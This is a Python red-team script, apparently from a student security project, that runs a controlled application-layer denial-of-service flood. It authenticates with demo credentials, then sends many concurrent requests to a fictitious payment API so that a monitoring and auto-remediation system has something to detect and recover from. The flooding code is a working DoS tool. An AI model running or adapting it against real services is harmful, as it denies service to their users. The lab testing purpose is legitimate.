#!/usr/bin/env python3
"""Scénario Red Team #1 — DoS applicatif contrôlé (épuisement de ressources).

Python standard uniquement (aucune dépendance à installer).
À LANCER DEPUIS LE PC ATTAQUANT, contre le SI fictif de l'équipe (sujet §9).

But : saturer le pool de connexions de payment-api -> pic de latence + erreurs OBSERVABLES,
que le détecteur ML repère et que le moteur de remédiation corrige automatiquement.

L'attaquant ne peut joindre que :
  - le WAF (port 8080) qui expose l'API métier  -> cible du flood ;
  - le dashboard (port 3001) qui proxifie l'auth -> pour obtenir un jeton.

Usage :
    python3 dos_flood.py --target http://localhost:8080 --concurrency 60 --duration 40
    # démo réseau : --target http://192.168.137.1:8080
"""
import argparse, json, threading, time, urllib.request, urllib.error
from urllib.parse import urlsplit

DEMO_USER, DEMO_PASS = "demo", "demo1234"   # identifiants FICTIFS de démo


def auth_url_from(target: str) -> str:
    u = urlsplit(target)
    return f"{u.scheme}://{u.hostname}:3001/api/auth/login"


def login(target: str) -> str:
    url = auth_url_from(target)
    data = json.dumps({"username": DEMO_USER, "password": DEMO_PASS}).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())["access_token"]
    except Exception as e:
        raise SystemExit(f"Login impossible via {url} : {e}\n"
                         f"Vérifiez que la plateforme tourne (dashboard sur :3001).")


def worker(target, token, stop_at, stats, lock):
    req = urllib.request.Request(f"{target}/accounts", headers={"Authorization": f"Bearer {token}"})
    while time.perf_counter() < stop_at:
        t0 = time.perf_counter()
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                r.read()
            dt = time.perf_counter() - t0
            with lock:
                stats["total"] += 1; stats["lat"].append(dt)
        except urllib.error.HTTPError as e:
            with lock:
                stats["total"] += 1
                if e.code >= 500: stats["err"] += 1
        except Exception:
            with lock:
                stats["total"] += 1; stats["err"] += 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8080", help="URL du WAF (frontal payment-api)")
    ap.add_argument("--concurrency", type=int, default=60)
    ap.add_argument("--duration", type=int, default=40, help="durée en secondes")
    args = ap.parse_args()

    print(f"[*] Authentification (via {urlsplit(args.target).hostname}:3001)…")
    token = login(args.target)
    print(f"[*] DoS contrôlé : {args.concurrency} threads pendant {args.duration}s sur {args.target}/accounts")
    print("    → observez le dashboard : latence et erreurs grimpent, puis le système se rétablit SEUL.")

    stats = {"total": 0, "err": 0, "lat": []}
    lock = threading.Lock()
    stop_at = time.perf_counter() + args.duration
    threads = [threading.Thread(target=worker, args=(args.target, token, stop_at, stats, lock))
               for _ in range(args.concurrency)]
    for t in threads: t.start()
    for t in threads: t.join()

    lat = sorted(stats["lat"])
    p95 = lat[int(len(lat) * 0.95)] if lat else 0
    avg = sum(lat) / len(lat) if lat else 0
    print(f"\n[résultat attaquant] requêtes={stats['total']} erreurs={stats['err']} "
          f"({100 * stats['err'] / max(stats['total'],1):.1f}%) | "
          f"latence moy={avg*1000:.0f}ms p95={p95*1000:.0f}ms")
    print("[*] Attaque terminée. La reprise doit apparaître dans l'historique de remédiation.")


if __name__ == "__main__":
    main()
